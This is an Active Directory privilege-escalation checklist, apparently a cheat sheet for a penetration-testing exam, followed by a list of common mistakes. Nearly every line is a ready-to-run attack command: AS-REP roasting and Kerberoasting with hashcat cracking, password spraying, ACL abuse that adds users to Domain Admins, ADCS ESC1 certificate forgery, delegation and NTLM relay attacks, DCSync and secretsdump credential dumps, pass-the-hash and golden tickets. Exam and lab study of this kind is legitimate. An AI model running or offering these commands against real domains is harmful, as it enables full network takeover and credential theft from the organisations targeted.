[ 00 ] METHODOLOGY CHECKLIST · AD PRIVESC
click to mark done · resets on reload

Run in order of effort-to-payoff. Pre-auth attacks first (free with just a username), then ACL/Kerberos with creds. BloodHound drives everything — mark Owned after every cred, re-query shortest path. ADCS and delegation are high-payoff but need more setup.

▸ 0. BLOODHOUND — runs continuously as you gain creds
  • Collect — bloodhound-python -c All -d $DOMAIN -u <user> -p <pwd> -ns $DC --zip
  • Mark Owned — in BH UI, right-click each compromised user/host → Mark as Owned
  • Query — Analysis → Shortest Paths to Domain Admins from Owned Principals
  • Re-collect after every new cred — stale data misses new ACL paths
▸ 1. PRE-AUTH — username only required
  • AS-REP roast — impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC -format hashcat
  • Crack — hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
  • Password spray (check lockout first!) — nxc smb $DC -u users.txt -p 'Password123' --no-bruteforce
  • Spray with username = password — nxc smb $DC -u users.txt -p users.txt --no-bruteforce
▸ 2. KERBEROS ATTACKS — with valid creds
  • Kerberoast — impacket-GetUserSPNs $DOMAIN/<user>:<pwd> -dc-ip $DC -request -outputfile kerb.txt
  • Crack TGS — hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
  • Targeted Kerberoast (GenericWrite/All on SPN acct) — targetedKerberoast.py -d $DOMAIN -u <user> -p <pwd> --dc-ip $DC
▸ 3. ACL ABUSE — from BloodHound edges
  • GenericAll on user → force-change password — net rpc password "<target>" "NewPwd123!" -U "$DOMAIN/<you>%<pwd>" -S $DC
  • GenericAll on group → add yourself — net rpc group addmem "Domain Admins" "<you>" -U "$DOMAIN/<you>%<pwd>" -S $DC
  • GenericWrite on user → targeted Kerberoast — targetedKerberoast.py -d $DOMAIN -u <user> -p <pwd> · or ShadowCredentials — certipy shadow auto -u "<user>@$DOMAIN" -p "<pwd>" -account "<target>"
  • WriteDACL → grant DCSync rights — impacket-dacledit "$DOMAIN/<you>:<pwd>" -action write -rights DCSync -principal <you> -target-dn "DC=<domain>,DC=local" -dc-ip $DC
  • ForceChangePassword — impacket-changepasswd $DOMAIN/<target>:FakeOld@$DC -newpass NewPwd123! -authtype ntlm or via PowerView
  • AddMember (WriteMember on group) — net rpc group addmem "<group>" "<you>" -U "$DOMAIN/<you>%<pwd>" -S $DC
  • ReadGMSAPassword — nxc ldap $DC -u <user> -p <pwd> --gmsa
  • ReadLAPSPassword — nxc ldap $DC -u <user> -p <pwd> -M laps
▸ 4. ADCS — certipy (enumerate then attack)
  • Find vulnerable templates — certipy find -u "<user>@$DOMAIN" -p "<pwd>" -dc-ip $DC -vulnerable
  • ESC1 (enroll + subjectAltName) — certipy req -u "<user>@$DOMAIN" -p "<pwd>" -ca "<CA-name>" -template "<template>" -upn "administrator@$DOMAIN" -dc-ip $DC
  • Authenticate with cert — certipy auth -pfx administrator.pfx -dc-ip $DC → gets NT hash
  • PtH or PtT with the hash/TGT — impacket-psexec <user>@<IP> -hashes :<NT> or export KRB5CCNAME=<ticket.ccache>; impacket-psexec -k -no-pass <target>
▸ 5. DELEGATION ABUSE
  • Find unconstrained — BH query: MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS 'DC' RETURN c
  • Unconstrained: wait for admin to connect (or force via printerbug) → dump TGT — mimikatz # sekurlsa::tickets /export
  • Find constrained — BH: "Shortest Paths to Kerberoastable Users" / GetUserSPNs -request-user <target>
  • Constrained S4U2Proxy — impacket-getST $DOMAIN/<svc>:<pwd> -spn cifs/<target> -impersonate administrator -dc-ip $DC
  • RBCD (WriteMSDS-AllowedToActOnBehalfOfOtherIdentity) — impacket-rbcd -action write -delegate-to <target$> -delegate-from <controlled$> $DOMAIN/<user>:<pwd> -dc-ip $DC
▸ 6. NTLM RELAY
  • Check SMB signing off on targets — nxc smb <subnet>/24 --gen-relay-list relay-targets.txt
  • Start responder (no SMB/HTTP capture) — sudo responder -I tun0 --no-smb-server --no-http-server
  • Start ntlmrelayx — impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks
  • Force auth (printerbug) — impacket-printerbug $DOMAIN/<user>:<pwd>@<src> <KALI>
  • Use SOCKS proxy — proxychains nxc smb <target> -u '' -p '' -d $DOMAIN
▸ 7. END-GAME — from DA or DCSync rights
  • DCSync — impacket-secretsdump $DOMAIN/<da-user>:<pwd>@$DC -just-dc-ntlm
  • PtH as Administrator — impacket-psexec administrator@$DC -hashes :<NT>
  • Golden ticket — impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain $DOMAIN -groups 512,513 anyuser
  • Dump all secrets — impacket-secretsdump $DOMAIN/administrator@$DC -hashes :<NT> -just-dc-ntlm

[ ⚠ ] ANTI-PATTERNS
Grind on Kerberoasting when no SPN accounts exist
Check first with GetUserSPNs (no --request). Empty list = move on. AS-REP roast as fallback.
Try DCSync without checking BH first
Get-ObjectAcl path of DS-Replication-Get-Changes-All must be on YOUR account or a group you can join. BH "Outbound Object Control" view.
Run targetedKerberoast without verifying GenericWrite
Setting an SPN requires GenericWrite or GenericAll on the user object. Confirm in BH first, otherwise you waste time on perm-denied.
Crack kerberoast hash with default rockyou rules
Service accounts have long pwds. Use rockyou.txt + best64.rule minimum. Or kerberoast → 90% need OneRuleToRuleThemAll.
Skip ADCS because it sounds advanced
ESC1 is "request a cert as anyone" in one command. certipy find → certipy req. Often faster than ACL chains.
Forget to time-sync before Kerberos attacks
KRB_AP_ERR_SKEW means your Kali clock is >5min off the DC. sudo rdate -n <DC> or sudo ntpdate <DC>.
Leave injected SPN / added group member after attack
Graders penalize lingering changes. setspn -D, net group remove, delete certs you requested. Cleanup field on each card.
Try RBCD without a computer account you control
RBCD needs an SPN on the principal you're using. Default users can add computer via MachineAccountQuota=10 — use that.
Run BloodHound once, never re-ingest
Every new cred opens new paths. Re-collect (or just mark-owned + re-query) after EVERY pop. The graph changes.
Crack Kerberos hashes for hours mid-exam
15min cap. Move on to a different attack while hashcat runs in the background — don't stare at it.
